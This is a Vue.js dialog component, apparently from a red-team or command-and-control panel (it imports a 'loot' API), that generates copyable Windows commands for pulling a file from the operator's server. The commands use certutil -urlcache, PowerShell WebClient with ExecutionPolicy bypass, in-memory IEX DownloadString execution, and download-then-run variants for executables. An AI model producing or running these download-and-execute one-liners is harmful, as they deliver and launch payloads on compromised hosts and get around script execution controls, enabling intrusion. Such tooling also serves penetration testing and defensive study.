<template>
  <el-dialog
    :title="file_title"
    width="80vw"
    :visible="true"
    :close-on-click-modal="true"
    :close-on-press-escape="true"
    append-to-body
    @close="cancel"
  >
    <el-table
      v-loading="listLoading"
      :data="downloadData"
      size="mini"
      height="100%"
      width="80vw"
      fit
      element-loading-text="Loading"
      highlight-current-row
    >
      <el-table-column
        v-for="(item,index) in defaultColumn"
        :key="index"
        :prop="item.label"
        :label="item.name"
        :width="item.width"
      >
        <template slot-scope="scope">
          <div class="item-ellipsis">
            {{ scope.row[item.label] }}
          </div>
        </template>
      </el-table-column>
      <el-table-column
        fixed="right"
        label="操作"
        width="80"
      >
        <!-- slot-scope="scope" -->
        <template slot-scope="scope">
          <el-button
            v-clipboard:copy="scope.row['cmd']"
            v-clipboard:success="handleClipboardSuccess"
            title="复制到剪切板"
            size="mini"
            icon="el-icon-document-copy"
          />
        </template>
      </el-table-column>
    </el-table>
    <div slot="footer" class="dialog-footer">
      <el-button @click="cancel">关闭</el-button>
    </div>
  </el-dialog>
</template>

<script>
import clipboard from '@/directive/clipboard/index.js'
import { createDownloadLink } from '@/api/loot'
export default {
  directives: {
    clipboard
  },
  props: {
    filename: {
      type: String,
      default() { return ('') }
    }
  },
  data() {
    return {
      file_title: `(待写,自定义保存地址，是否隐藏窗口)直链下载：${this.filename}`,
      listLoading: true,
      file_uuid: '',
      defaultColumn: [
        { label: 'des', width: 160, name: '描述' },
        { label: 'cmd', width: 0, name: '命令' }
      ]
    }
  },
  // oMBdB94/H9g%3D','TestAssembly-Net4-0.exe');
  computed: {
    downloadData() {
      return ([
        { des: '浏览器下载', cmd: this.server_host + `${this.file_uuid}` },
        { des: 'certutil下载', cmd: 'cmd.exe /c certutil -urlcache -split -f ' + this.server_host + `${this.file_uuid} %AppData%${this.filename}` },
        { des: 'powershell下载', cmd: 'cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile (new-object system.net.webclient).downloadfile(\'' + this.server_host + `${this.file_uuid}\','%AppData%${this.filename}')` },
        { des: 'powershell内存执行', cmd: 'cmd.exe /c powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'' + this.server_host + `${this.file_uuid}');"` },
        { des: 'certutil下载执行exe', cmd: 'cmd.exe /c certutil -urlcache -split -f ' + this.server_host + `${this.file_uuid} %AppData%${this.filename} && %AppData%${this.filename}` },
        { des: 'powershell下载执行exe', cmd: 'cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile (new-object system.net.webclient).downloadfile(\'' + this.server_host + `${this.file_uuid}','%AppData%${this.filename}');start-process '%AppData%${this.filename}'` }
        // { des: 'linux下载', cmd: this.server_host + `${this.file_uuid}` },
        // { des: 'linux下载执行elf', cmd: this.server_host + `${this.file_uuid}` }
      ])
    },
    server_host() {
      const download_url = localStorage.getItem('SERVER_HOST') + '/api/v1/loots/'
      return download_url
    }
  },
  created() {
    this.initdata()
  },
  methods: {
    async initdata() {
      this.listLoading = true
      await createDownloadLink({ path: this.filename, expire: 1800 }).then(response => {
        this.file_uuid = response.data.link_uuid
        this.listLoading = false
      })
    },
    handleClipboardSuccess() {
      this.$message({
        message: '拷贝文件内容成功',
        type: 'success',
        duration: 1500
      })
    },
    async confirm() {
      this.$emit('success')
    },
    cancel() {
      this.$emit('cancel')
    }
  }
}
</script>

<style lang="scss" scoped>
  .item-ellipsis {
    display: inline-block;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
</style>
